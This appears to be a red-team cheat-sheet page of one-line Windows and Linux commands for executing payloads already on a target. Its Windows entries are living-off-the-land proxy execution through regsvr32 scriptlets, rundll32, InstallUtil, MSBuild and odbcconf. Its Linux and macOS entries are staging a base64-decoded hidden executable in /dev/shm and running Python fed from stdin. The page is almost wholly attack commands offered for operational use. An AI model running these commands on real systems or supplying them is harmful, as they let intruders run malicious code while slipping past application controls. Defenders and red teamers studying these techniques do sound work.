# LOLBin & Local Execution

One-line execution primitives for payloads or scripts already available on the target.

<div class="ol-section-kicker"><span>RT</span><strong>Execution</strong></div>

## regsvr32 local scriptlet

```cmd
regsvr32.exe /s /u /i:payload.sct scrobj.dll
```

**Tool:** regsvr32 · **Platform:** Windows · **Tags:** Scriptlet, LOLBin, Proxy Execution

## rundll32 DLL export

```cmd
rundll32.exe payload.dll,EntryPoint
```

**Tool:** rundll32 · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution

## InstallUtil uninstall path

```cmd
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

**Tool:** InstallUtil · **Platform:** Windows · **Tags:** .NET, LOLBin, Execution

## MSBuild project execution

```cmd
MSBuild.exe payload.xml
```

**Tool:** MSBuild · **Platform:** Windows · **Tags:** MSBuild, LOLBin, Execution

## ODBCConf DLL registration

```cmd
odbcconf.exe /S /A {REGSVR payload.dll}
```

**Tool:** odbcconf · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution

## Decode base64 to tmpfs

```bash
printf '%s' '<BASE64>' | base64 -d > /dev/shm/.p && chmod +x /dev/shm/.p
```

**Tool:** base64 · **Platform:** Linux · **Tags:** Decode, tmpfs, Staging

## Execute Python from stdin

```bash
python3 -c "exec(open('/dev/stdin').read())" < payload.py
```

**Tool:** Python · **Platform:** Linux/macOS · **Tags:** Python, stdin, Execution
